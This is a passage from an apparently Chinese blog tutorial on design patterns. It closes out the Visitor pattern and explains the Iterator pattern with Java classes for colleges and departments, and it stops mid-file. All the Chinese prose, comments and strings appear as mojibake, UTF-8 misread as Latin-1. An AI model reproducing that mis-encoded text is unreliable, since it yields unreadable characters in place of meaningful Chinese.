è®¿é—®è€…æ¨¡å¼çš„æ³¨æ„äº‹é¡¹å’Œç»†èŠ‚</h2><ol><li><p>ä¼˜ç‚¹</p><ul><li><p>è®¿é—®è€…æ¨¡å¼ç¬¦åˆå•ä¸€èŒè´£åŸåˆ™ã€è®©ç¨‹åºå…·æœ‰ä¼˜ç§€çš„æ‰©å±•æ€§ã€çµæ´»æ€§éå¸¸é«˜</p></li><li><p>è®¿é—®è€…æ¨¡å¼å¯ä»¥å¯¹åŠŸèƒ½è¿›è¡Œç»Ÿä¸€ï¼Œå¯ä»¥åšæŠ¥è¡¨ã€UIã€æ‹¦æˆªå™¨ä¸è¿‡æ»¤å™¨ï¼Œé€‚ç”¨äºæ•°æ®ç»“æ„ç›¸å¯¹ç¨³å®šçš„ç³»ç»Ÿ</p></li></ul></li><li><p>ç¼ºç‚¹</p></li></ol><ul><li><p>å…·ä½“å…ƒç´ å¯¹è®¿é—®è€…å…¬å¸ƒç»†èŠ‚ï¼Œä¹Ÿå°±æ˜¯è¯´è®¿é—®è€…å…³æ³¨äº†å…¶ä»–ç±»çš„å†…éƒ¨ç»†èŠ‚ï¼Œè¿™æ˜¯è¿ªç±³ç‰¹æ³•åˆ™æ‰€ä¸å»ºè®®çš„, è¿™æ ·é€ æˆäº†å…·ä½“å…ƒç´ å˜æ›´æ¯”è¾ƒå›°éš¾</p></li><li><p>è¿èƒŒäº†ä¾èµ–å€’è½¬åŸåˆ™ã€‚è®¿é—®è€…ä¾èµ–çš„æ˜¯å…·ä½“å…ƒç´ ï¼Œè€Œä¸æ˜¯æŠ½è±¡å…ƒç´ </p></li><li><p>å› æ­¤ï¼Œ<strong>å¦‚æœä¸€ä¸ªç³»ç»Ÿæœ‰æ¯”è¾ƒç¨³å®šçš„æ•°æ®ç»“æ„</strong>ï¼Œåˆæœ‰ç»å¸¸å˜åŒ–çš„åŠŸèƒ½éœ€æ±‚ï¼Œé‚£ä¹ˆ<strong>è®¿é—®è€…æ¨¡å¼å°±æ˜¯æ¯”è¾ƒåˆé€‚</strong>çš„</p></li></ul><h1 id="è¿­ä»£å™¨æ¨¡å¼"><a class="markdownIt-Anchor" href="#è¿­ä»£å™¨æ¨¡å¼"></a> <mark>è¿­ä»£å™¨æ¨¡å¼</mark></h1><p>è¿­ä»£å™¨æ¨¡å¼ï¼ˆIterator Patternï¼‰æ˜¯ Java å’Œ .Net ç¼–ç¨‹ç¯å¢ƒä¸­éå¸¸å¸¸ç”¨çš„è®¾è®¡æ¨¡å¼ã€‚è¿™ç§æ¨¡å¼ç”¨äºé¡ºåºè®¿é—®é›†åˆå¯¹è±¡çš„å…ƒç´ ï¼Œä¸éœ€è¦çŸ¥é“é›†åˆå¯¹è±¡çš„åº•å±‚è¡¨ç¤ºã€‚</p><p>è¿­ä»£å™¨æ¨¡å¼å±äºè¡Œä¸ºå‹æ¨¡å¼ã€‚</p><h2 id="ä»‹ç»-15"><a class="markdownIt-Anchor" href="#ä»‹ç»-15"></a> ä»‹ç»</h2><p><strong>æ„å›¾ï¼š</strong> æä¾›ä¸€ç§æ–¹æ³•é¡ºåºè®¿é—®ä¸€ä¸ªèšåˆå¯¹è±¡ä¸­å„ä¸ªå…ƒç´ , è€Œåˆæ— é¡»æš´éœ²è¯¥å¯¹è±¡çš„å†…éƒ¨è¡¨ç¤ºã€‚</p><p><strong>ä¸»è¦è§£å†³ï¼š</strong> ä¸åŒçš„æ–¹å¼æ¥éå†æ•´ä¸ªæ•´åˆå¯¹è±¡ã€‚</p><p><strong>ä½•æ—¶ä½¿ç”¨ï¼š</strong> éå†ä¸€ä¸ªèšåˆå¯¹è±¡ã€‚</p><p><strong>å¦‚ä½•è§£å†³ï¼š</strong> æŠŠåœ¨å…ƒç´ ä¹‹é—´æ¸¸èµ°çš„è´£ä»»äº¤ç»™è¿­ä»£å™¨ï¼Œè€Œä¸æ˜¯èšåˆå¯¹è±¡ã€‚</p><p><strong>å…³é”®ä»£ç ï¼š</strong> å®šä¹‰æ¥å£ï¼šhasNext, nextã€‚</p><p><strong>åº”ç”¨å®ä¾‹ï¼š</strong> JAVA ä¸­çš„ iteratorã€‚</p><p><strong>ä¼˜ç‚¹ï¼š</strong> 1ã€å®ƒæ”¯æŒä»¥ä¸åŒçš„æ–¹å¼éå†ä¸€ä¸ªèšåˆå¯¹è±¡ã€‚ 2ã€è¿­ä»£å™¨ç®€åŒ–äº†èšåˆç±»ã€‚ 3ã€åœ¨åŒä¸€ä¸ªèšåˆä¸Šå¯ä»¥æœ‰å¤šä¸ªéå†ã€‚<br />4ã€åœ¨è¿­ä»£å™¨æ¨¡å¼ä¸­ï¼Œå¢åŠ æ–°çš„èšåˆç±»å’Œè¿­ä»£å™¨ç±»éƒ½å¾ˆæ–¹ä¾¿ï¼Œæ— é¡»ä¿®æ”¹åŸæœ‰ä»£ç ã€‚</p><p><strong>ç¼ºç‚¹ï¼š</strong> ç”±äºè¿­ä»£å™¨æ¨¡å¼å°†å­˜å‚¨æ•°æ®å’Œéå†æ•°æ®çš„èŒè´£åˆ†ç¦»ï¼Œå¢åŠ æ–°çš„èšåˆç±»éœ€è¦å¯¹åº”å¢åŠ æ–°çš„è¿­ä»£å™¨ç±»ï¼Œç±»çš„ä¸ªæ•°æˆå¯¹å¢åŠ ï¼Œè¿™åœ¨ä¸€å®šç¨‹åº¦ä¸Šå¢åŠ äº†ç³»ç»Ÿçš„å¤æ‚æ€§ã€‚</p><p><strong>ä½¿ç”¨åœºæ™¯ï¼š</strong> 1ã€è®¿é—®ä¸€ä¸ªèšåˆå¯¹è±¡çš„å†…å®¹è€Œæ— é¡»æš´éœ²å®ƒçš„å†…éƒ¨è¡¨ç¤ºã€‚ 2ã€éœ€è¦ä¸ºèšåˆå¯¹è±¡æä¾›å¤šç§éå†æ–¹å¼ã€‚ 3ã€ä¸ºéå†ä¸åŒçš„èšåˆç»“æ„æä¾›ä¸€ä¸ªç»Ÿä¸€çš„æ¥å£ã€‚</p><p><strong>æ³¨æ„äº‹é¡¹ï¼š</strong><br />è¿­ä»£å™¨æ¨¡å¼å°±æ˜¯åˆ†ç¦»äº†é›†åˆå¯¹è±¡çš„éå†è¡Œä¸ºï¼ŒæŠ½è±¡å‡ºä¸€ä¸ªè¿­ä»£å™¨ç±»æ¥è´Ÿè´£ï¼Œè¿™æ ·æ—¢å¯ä»¥åšåˆ°ä¸æš´éœ²é›†åˆçš„å†…éƒ¨ç»“æ„ï¼Œåˆå¯è®©å¤–éƒ¨ä»£ç é€æ˜åœ°è®¿é—®é›†åˆå†…éƒ¨çš„æ•°æ®ã€‚</p><h2 id="å®ç°-13"><a class="markdownIt-Anchor" href="#å®ç°-13"></a> å®ç°</h2><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230103201406957.png" alt="image-20230103201406957" /></p><p><code>Client.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.iterator;<br><br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * ç›¸å½“äºä¸€ä¸ªå¤§å­¦</span><br><span class="hljs-comment">         *</span><br><span class="hljs-comment">         */</span><br>        List&lt;College&gt; collegeList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;College&gt;();<br><br>        <span class="hljs-comment">//åˆ›å»ºå­¦é™¢</span><br>        <span class="hljs-type">ComputerCollege</span> <span class="hljs-variable">computerCollege</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ComputerCollege</span>();<br>        <span class="hljs-type">InfoCollege</span> <span class="hljs-variable">infoCollege</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InfoCollege</span>();<br><br>        collegeList.add(computerCollege);<br>        collegeList.add(infoCollege);<br><br>        <span class="hljs-type">OutPutImpl</span> <span class="hljs-variable">outPutImpl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OutPutImpl</span>(collegeList);<br>        outPutImpl.printCollege();<br><br>    &#125;<br><br><br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>College.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.iterator;<br><br><span class="hljs-keyword">import</span> java.util.Iterator;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">College</span> &#123;<br>   <br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span>;<br>   <br>   <span class="hljs-comment">//å¢åŠ ç³»çš„æ–¹æ³•</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addDepartment</span><span class="hljs-params">(String name, String desc)</span>;<br>   <br>   <span class="hljs-comment">//è¿”å›ä¸€ä¸ªè¿­ä»£å™¨,éå†</span><br>   <span class="hljs-keyword">public</span> Iterator  <span class="hljs-title function_">createIterator</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>ComputerCollege.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.iterator;<br><br><span class="hljs-keyword">import</span> java.util.Iterator;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ComputerCollege</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">College</span> &#123;<br><br>   Department[] departments;<br>   <span class="hljs-type">int</span> <span class="hljs-variable">numOfDepartment</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span> ;<span class="hljs-comment">// ä¿å­˜å½“å‰æ•°ç»„çš„å¯¹è±¡ä¸ªæ•°</span><br>   <br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">ComputerCollege</span><span class="hljs-params">()</span> &#123;<br>      departments = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Department</span>[<span class="hljs-number">5</span>];<br>      addDepartment(<span class="hljs-string">&quot;Javaä¸“ä¸š&quot;</span>, <span class="hljs-string">&quot; Javaä¸“ä¸š &quot;</span>);<br>      addDepartment(<span class="hljs-string">&quot;PHPä¸“ä¸š&quot;</span>, <span class="hljs-string">&quot; PHPä¸“ä¸š &quot;</span>);<br>      addDepartment(<span class="hljs-string">&quot;å¤§æ•°æ®ä¸“ä¸š&quot;</span>, <span class="hljs-string">&quot; å¤§æ•°æ®ä¸“ä¸š &quot;</span>);<br>      <br>   &#125;<br>   <br>   <br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;è®¡ç®—æœºå­¦é™¢&quot;</span>;<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addDepartment</span><span class="hljs-params">(String name, String desc)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-type">Department</span> <span class="hljs-variable">department</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Department</span>(name, desc);<br>      departments[numOfDepartment] = department;<br>      numOfDepartment += <span class="hljs-number">1</span>;<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> Iterator <span class="hljs-title function_">createIterator</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ComputerCollegeIterator</span>(departments);<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>ComputerCollegeIterator.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.iterator;<br><br><span class="hljs-keyword">import</span> java.util.Iterator;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ComputerCollegeIterator</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Iterator</span> &#123;<br><br>   <span class="hljs-comment">//è¿™é‡Œæˆ‘ä»¬éœ€è¦Department æ˜¯ä»¥æ€æ ·çš„æ–¹å¼å­˜æ”¾=&gt;æ•°ç»„</span><br>   Department[] departments;<br>   <span class="hljs-type">int</span> <span class="hljs-variable">position</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; <span class="hljs-comment">//éå†çš„ä½ç½®</span><br>   <br>   <br>   <br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">ComputerCollegeIterator</span><span class="hljs-params">(Department[] departments)</span> &#123;<br>      <span class="hljs-built_in">this</span>.departments = departments;<br>   &#125;<br><br>   <span class="hljs-comment">//åˆ¤æ–­æ˜¯å¦è¿˜æœ‰ä¸‹ä¸€ä¸ªå…ƒç´ </span><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">hasNext</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-keyword">if</span>(position &gt;= departments.length || departments[position] == <span class="hljs-literal">null</span>) &#123;<br>         <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>      &#125;<span class="hljs-keyword">else</span> &#123;<br>      <br>         <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>      &#125;<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">next</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-type">Department</span> <span class="hljs-variable">department</span> <span class="hljs-operator">=</span> departments[position];<br>      position += <span class="hljs-number">1</span>;<br>      <span class="hljs-keyword">return</span> department;<br>   &#125;<br>   <br>   <span class="hljs-comment">//åˆ é™¤çš„æ–¹æ³•ï¼Œé»˜è®¤ç©ºå®ç°</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">remove</span><span class="hljs-params">()</span> &#123;<br>      <br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>Department.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.iterator;<br><br><span class="hljs-comment">//ç³»</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Department</span> &#123;<br><br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> String desc;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Department</span><span class="hljs-params">(String name, String desc)</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.desc = desc;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getDesc</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> desc;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setDesc</span><span class="hljs-params">(String desc)</span> &#123;<br>        <span class="hljs-built_in">this</span>.desc = desc;<br>    &#125;<br><br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>InfoColleageIterator.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.iterator;<br><br><span class="hljs-keyword">import</span> java.util.Iterator;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InfoColleageIterator</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Iterator</span> &#123;<br><br><br>    List&lt;Department&gt; departmentList; <span class="hljs-comment">// ä¿¡æ¯å·¥ç¨‹å­¦é™¢æ˜¯ä»¥Listæ–¹å¼å­˜æ”¾ç³»</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;<span class="hljs-comment">//ç´¢å¼•</span><br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">InfoColleageIterator</span><span class="hljs-params">(List&lt;Department&gt; departmentList)</span> &#123;<br>        <span class="hljs-built_in">this</span>.departmentList = departmentList;<br>    &#125;<br><br>    <span class="hljs-comment">//åˆ¤æ–­listä¸­è¿˜æœ‰æ²¡æœ‰ä¸‹ä¸€ä¸ªå…ƒç´ </span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">hasNext</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">// TODO Auto-generated method stub</span><br>        <span class="hljs-keyword">if</span> (index &gt;= departmentList.size() - <span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            index += <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">next</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">// TODO Auto-generated method stub</span><br>        <span class="hljs-keyword">return</span> departmentList.get(index);<br>    &#125;<br><br>    <span class="hljs-comment">//ç©ºå®ç°remove</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">remove</span><span class="hljs-params">()</span> &#123;<br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>InfoCollege.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.iterator;<br><br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.Iterator;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InfoCollege</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">College</span> &#123;<br><br>   List&lt;Department&gt; departmentList;<br>   <br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">InfoCollege</span><span class="hljs-params">()</span> &#123;<br>      departmentList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;Department&gt;();<br>      addDepartment(<span class="hljs-string">&quot;ä¿¡æ¯å®‰å…¨ä¸“ä¸š&quot;</span>, <span class="hljs-string">&quot; ä¿¡æ¯å®‰å…¨ä¸“ä¸š &quot;</span>);<br>      addDepartment(<span class="hljs-string">&quot;ç½‘ç»œå®‰å…¨ä¸“ä¸š&quot;</span>, <span class="hljs-string">&quot; ç½‘ç»œå®‰å…¨ä¸“ä¸š &quot;</span>);<br>      addDepartment(<span class="hljs-string">&quot;æœåŠ¡å™¨å®‰å…¨ä¸“ä¸š&quot;</span>, <span class="hljs-string">&quot; æœåŠ¡å™¨å®‰å…¨ä¸“ä¸š &quot;</span>);<br>   &#125;<br>   <br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;ä¿¡æ¯å·¥ç¨‹å­¦é™¢&quot;</span>;<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addDepartment</span><span class="hljs-params">(String name, String desc)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-type">Department</span> <span class="hljs-variable">department</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Department</span>(name, desc);<br>      departmentList.add(department);<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> Iterator <span class="hljs-title function_">createIterator</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InfoColleageIterator</span>(departmentList);<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>OutPutImpl.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.iterator;<br><br><span class="hljs-keyword">import</span> java.util.Iterator;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OutPutImpl</span> &#123;<br>   <br>   <span class="hljs-comment">//å­¦é™¢é›†åˆ</span><br>   List&lt;College&gt; collegeList;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">OutPutImpl</span><span class="hljs-params">(List&lt;College&gt; collegeList)</span> &#123;<br>      <br>      <span class="hljs-built_in">this</span>.collegeList = collegeList;<br>   &#125;<br>   <span class="hljs-comment">//éå†æ‰€æœ‰å­¦é™¢,ç„¶åè°ƒç”¨printDepartment è¾“å‡ºå„ä¸ªå­¦é™¢çš„ç³»</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printCollege</span><span class="hljs-params">()</span> &#123;<br>      <br>      <span class="hljs-comment">//ä»collegeList å–å‡ºæ‰€æœ‰å­¦é™¢, Java ä¸­çš„ List å·²ç»å®ç°Iterator</span><br>      Iterator&lt;College&gt; iterator = collegeList.iterator();<br>      <br>      <span class="hljs-keyword">while</span>(iterator.hasNext()) &#123;<br>         <span class="hljs-comment">//å–å‡ºä¸€ä¸ªå­¦é™¢</span><br>         <span class="hljs-type">College</span> <span class="hljs-variable">college</span> <span class="hljs-operator">=</span> iterator.next();<br>         System.out.println(<span class="hljs-string">&quot;=== &quot;</span>+college.getName() +<span class="hljs-string">&quot;=====&quot;</span> );<br>         printDepartment(college.createIterator()); <span class="hljs-comment">//å¾—åˆ°å¯¹åº”è¿­ä»£å™¨</span><br>      &#125;<br>   &#125;<br>   <br>   <br>   <span class="hljs-comment">//è¾“å‡º 